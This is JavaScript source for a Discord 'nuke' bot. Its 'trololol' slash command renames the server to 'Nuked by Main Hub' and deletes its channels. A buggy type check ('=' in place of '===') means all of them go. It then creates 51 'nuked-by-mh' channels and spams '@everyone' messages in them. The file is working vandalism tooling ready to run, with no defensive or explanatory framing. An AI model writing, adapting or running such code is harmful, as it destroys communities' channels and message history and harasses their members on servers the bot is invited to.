const { Client, GatewayIntentBits, ChannelType, Collection, BaseGuildTextChannel } = require('discord.js');
const { token } = require('./config.json');
const client = new Client({intents: GatewayIntentBits.Guilds});

client.once('ready', () =>{
  console.log('Ready!')
})
//   function channelbomb(i){
//   i.guild.channels.create('nuked-by-mh', {
//         type: "text", //This create a text channel, you can make a voice one too, by changing "text" to "voice"
//         permissionOverwrites: [
//            {
//              id: i.guild.roles.everyone, //To make it be seen by a certain role, user an ID instead
//              allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'] //Allow permissions
// 		   }
//         ],
//       })
// }
  


client.on('interactionCreate', async interaction => {
	if (!interaction.isChatInputCommand()) return;

	const { commandName } = interaction;

	if (commandName === 'trololol') {
		await interaction.reply('trololol')
    await interaction.guild.setName('Nuked by Main Hub');
    interaction.guild.channels.cache.each(async (c) =>{
        if(c.type = ChannelType.GuildText) {
            c.delete();
        }
    })
    for (var i = 0; i < 51; i++) {
      interaction.guild.channels.create({ name: 'nuked-by-mh', reason: 'L' })
    }
    interaction.guild.channels.cache.each(async (c) =>{
        if(c.type = ChannelType.GuildText) {
            c.send('NUKED BY MAIN HUB @everyone')
        }
    })
    
    
  }
});
client.login(token);